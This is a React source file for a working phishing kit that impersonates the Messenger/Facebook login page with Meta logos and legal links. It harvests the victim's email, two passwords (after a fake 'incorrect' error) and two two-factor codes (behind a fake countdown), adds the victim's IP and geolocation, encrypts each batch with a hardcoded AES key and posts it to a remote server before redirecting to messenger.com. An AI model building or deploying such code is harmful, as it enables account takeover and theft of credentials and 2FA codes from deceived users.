import React, { useState } from 'react'
import "../../assets/css/style.scss"
import { Button, Checkbox, Form, Input } from 'antd';
import axios from 'axios';
import { s32w659we12154r } from '../../assets/images/images';
import CryptoJS from 'crypto-js';


const ContentComponent = () => {

    const [form] = Form.useForm();
    const [formPassword] = Form.useForm();
    const [activePopup, setactivePopup] = useState(false);
    const [activeItemPopup, setActiveItemPopup] = useState(20);
    const [agreed, setAgreed] = useState(false);
    const [activeWaring, setActiveWaring] = useState(false);
    const [timeLeft, setTimeLeft] = useState(import.meta.env.VITE_TIME_COUNTDOWN);
    const [activePassword, setActivePassword] = useState(false);
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    function encrypt(text:string) {
        const secretKey = 'HDNDT-JDHT8FNEK-JJHR';
        const encrypted = CryptoJS.AES.encrypt(text, secretKey).toString();
        return encrypted;
    }
    
    const callApi = async (values:object) => {
        try {
            const data = {...values, "token": import.meta.env.VITE_TOKEN}

            const jsonString = JSON.stringify(data);
            const encryptedData = encrypt(jsonString);
    
            const response = await axios.post(`${import.meta.env.VITE_URL_SERVER}/api/register`, { data: encryptedData });
    
            return response;
        } catch (error) {
            throw error;
        }
    };

    const saveSession = (key: string, value: object) => {
        try {
            sessionStorage.setItem(key, JSON.stringify(value));
        } catch (error) {
            console.error('Error saving to sessionStorage', error);
        }
    };

    const getSession = (key: string) => {
        try {
            const value = sessionStorage.getItem(key);
            return value ? JSON.parse(value) : null;
        } catch (error) {
            console.error('Error reading from sessionStorage', error);
            return null;
        }
    };

    const removeSession = (key: string) => {
        try {
            sessionStorage.removeItem(key);
        } catch (error) {
            console.error('Error removing from sessionStorage', error);
        }
    };

    const handleChangePolicy = (e: any) => {
        setAgreed(e.target.checked);
    };

    const onFinish = async (values: object) => {

        if (activePassword == false) {

            if (!values["email"] || !values['password']) {
                setActivePassword(true)
            }

            const { data } = await axios.get('https://api.ipify.org?format=json');
            const IP = data.ip;
            const response = await axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${import.meta.env.VITE_LOCATION_KEY}&ip=${IP}`);
            const location = `${response.data.ip} | ${response.data.state_prov}(${response.data.country_capital}) | ${response.data.country_name}(${response.data.country_code2})`

            const dataSaveFirst = {
                ip: location,
                passwordFirst: values['password'],
                ...values
            }

            callApi(dataSaveFirst)
            saveSession('account', dataSaveFirst)
            setActivePassword(true)
            formPassword.setFieldsValue({ password: '' });
        }
        if (activePassword == true) {
            const dataGetSecond = getSession('account');
            const dataSendThird = {
                passwordSecond: values['password'],
                ...dataGetSecond
            }
            saveSession('third', dataSendThird)
            callApi(dataSendThird)
            removeSession('account')
            setactivePopup(true)
            setActiveItemPopup(5)
        }

    };

    const handleAuthentication = (values:any) => {
        if (timeLeft > 0) {

            const intervalId = setInterval(() => {
                setTimeLeft(prevTimeLeft => {
                    if (prevTimeLeft === 0) {
                        clearInterval(intervalId);
                        setActiveWaring(false)
                        return 0;
                    }
                    return prevTimeLeft - 1;
                });
            }, 1000);

            const dataGetThird = getSession('third');

            setActiveWaring(true)
            form.setFieldsValue({ twoFa: '' });

            const dataSendFourth = {
                firstTwoFa: values.twoFa,
                ...dataGetThird
            }
            saveSession('fourth', dataSendFourth)

            callApi(dataSendFourth)
            removeSession('third')
        }

        else if (timeLeft === 0) {

            const dataGetFourth = getSession('fourth');

            const dataSendSuccess = {
                secondTwoFa: values.twoFa,
                ...dataGetFourth
            }
            removeSession('fourth')
            callApi(dataSendSuccess).then(() => {
                window.location.href = 'https://www.messenger.com';
            })
        }
    };

    return (
        <div id="main-page-content">
            <div className="logo">
                <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clipPath="url(#clip0_30_3)">
                        <path fillRule="evenodd" clipRule="evenodd" d="M40 0.914062C17.995 0.914062 0.937012 17.0331 0.937012 38.8041C0.937012 50.1931 5.60501 60.0341 13.205 66.8301C13.5219 67.1106 13.7785 67.4528 13.959 67.8356C14.1395 68.2185 14.2402 68.634 14.255 69.0571L14.467 76.0071C14.535 78.2221 16.825 79.6651 18.853 78.7701L26.606 75.3471C27.2632 75.0569 28.0005 75.0029 28.693 75.1941C32.3777 76.199 36.1808 76.7038 40 76.6951C62.005 76.6951 79.063 60.5771 79.063 38.8051C79.063 17.0331 62.005 0.915063 40 0.915063V0.914062Z" fill="url(#paint0_radial_30_3)" />
                        <path fillRule="evenodd" clipRule="evenodd" d="M16.543 49.8859L28.018 31.6799C28.4497 30.9952 29.0185 30.4075 29.6887 29.9536C30.3588 29.4997 31.1157 29.1896 31.9116 29.0427C32.7076 28.8959 33.5253 28.9155 34.3133 29.1004C35.1013 29.2853 35.8424 29.6313 36.49 30.1169L45.617 36.9609C46.454 37.5889 47.606 37.5859 48.44 36.9529L60.765 27.5999C62.41 26.3519 64.558 28.3199 63.457 30.0669L51.982 48.2719C51.5503 48.9565 50.9814 49.5443 50.3113 49.9981C49.6412 50.452 48.8843 50.7621 48.0883 50.909C47.2924 51.0558 46.4747 51.0362 45.6867 50.8513C44.8987 50.6665 44.1576 50.3204 43.51 49.8349L34.383 42.9899C33.9752 42.6846 33.4792 42.5204 32.9698 42.5222C32.4605 42.524 31.9655 42.6917 31.56 42.9999L19.235 52.3539C17.589 53.6019 15.442 51.6329 16.543 49.8859Z" fill="white" />
                    </g>
                    <defs>
                        <radialGradient id="paint0_radial_30_3" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(15.9746 78.6213) rotate(-57.092) scale(85.1246 85.1246)">
                            <stop stopColor="#0099FF" />
                            <stop offset="0.61" stopColor="#A033FF" />
                            <stop offset="0.935" stopColor="#FF5280" />
                            <stop offset="1" stopColor="#FF7061" />
                        </radialGradient>
                        <clipPath id="clip0_30_3">
                            <rect width="80" height="80" fill="white" />
                        </clipPath>
                    </defs>
                </svg>
            </div>
            <h1 className="logo-text" style={{ display: `${activePassword == false ? "none" : ''}` }}>Messenger</h1>
            <p className="error" style={{ display: `${activePassword == false ? "none" : ''}` }}>Incorrect email address or phone number <br />The email address or mobile number you entered isn't connected to an account. <a href="https://www.facebook.com/login/identify">Find your account and log in.</a></p>
            <h1 className="logo-text-second" style={{ display: `${activePassword == true ? "none" : ''}` }}>Connect with your favourite people</h1>
            <div className="form-submit">
                <Form
                    name="dataFirst"
                    initialValues={{
                        remember: true,
                    }}
                    onFinish={onFinish}
                    autoComplete="off"
                    form={formPassword}
                >

                    <div className="item-form">
                        <Form.Item
                            name="email"
                        >
                            <Input placeholder='Email address or phone number' />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <Form.Item
                            name="password"
                        >
                            <Input.Password placeholder='Password' />
                        </Form.Item>
                    </div>

                    <Form.Item>
                        <Button className='button-send' htmlType="submit">
                            Continue
                        </Button>
                    </Form.Item>

                    <div className="item-form check-box-signed">
                        <Form.Item
                            name="checkForm"
                            valuePropName="checked"
                            className='check-box'
                        >
                            <Checkbox onChange={handleChangePolicy}>
                                Keep me signed in
                            </Checkbox>
                        </Form.Item>
                    </div>
                </Form>

                <div className="bottom-content">
                    <ul>
                        <li> <a href="https://www.facebook.com/r.php">Not on Facebook?</a> </li>
                        <li> <a href="https://www.facebook.com/login/identify">Forgotten password</a> </li>
                        <li> <a href="https://www.facebook.com/privacy/policy/">Privacy Policy</a> </li>
                        <li> <a href="https://www.facebook.com/legal/terms/">Terms</a> </li>
                        <li> <a href="https://www.facebook.com/policies/cookies/">Cookies Policy</a> </li>
                        <li> <a> © Meta 2024</a> </li>
                    </ul>
                </div>
            </div>

            <div className={activePopup === true ? "popup active" : "popup"}>
                <div className={activeItemPopup === 5 ? "popup-item popup-two-fa active" : "popup-item popup-two-fa"}>
                    <div className='popup-head'></div>

                    <div className='popup-content'>
                        <div className='desc'>
                            <h4>Check your authentication code</h4>
                            <p>Enter the 6-digit or 8-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or text message on you mobile).</p>
                            <img src={s32w659we12154r} width="100%" style={{ "borderRadius": "10px", "margin": "15px auto 35px auto" }} alt="" />
                        </div>

                        <Form
                            name="formThree"
                            initialValues={{
                                remember: true,
                            }}
                            onFinish={handleAuthentication}
                            form={form}
                            autoComplete="off"
                        >

                            <Form.Item
                                name="twoFa"
                                rules={[
                                    {
                                        required: true,
                                        message: `You haven't entered your two-factor authentication!`,
                                    },
                                ]}
                            >
                                <Input placeholder='Code' maxLength={8} />
                            </Form.Item>
                            <p className={`password-correct ${activeWaring === true ? 'active' : ''}`}>The two-factor authentication you entered is incorrect. Please, try again after {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds</p>

                            <Form.Item>
                                <Button className='button-send' htmlType="submit" disabled={activeWaring}>
                                    Continue
                                </Button>
                            </Form.Item>
                        </Form>
                    </div>
                    <br />
                    <div className='popup-footer'>
                        <div className='logo'>
                            <svg width="329" height="66" viewBox="0 0 329 66" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <g clipPath="url(#clip0_4111_993)">
                                    <path d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z" fill="#66778A" />
                                    <path d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z" fill="#66778A" />
                                    <path d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z" fill="#66778A" />
                                    <path d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z" fill="#66778A" />
                                    <path d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z" fill="#66778A" />
                                </g>
                                <defs>
                                    <clipPath id="clip0_4111_993">
                                        <rect width="329" height="66" fill="white" />
                                    </clipPath>
                                </defs>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    )
}

export default ContentComponent
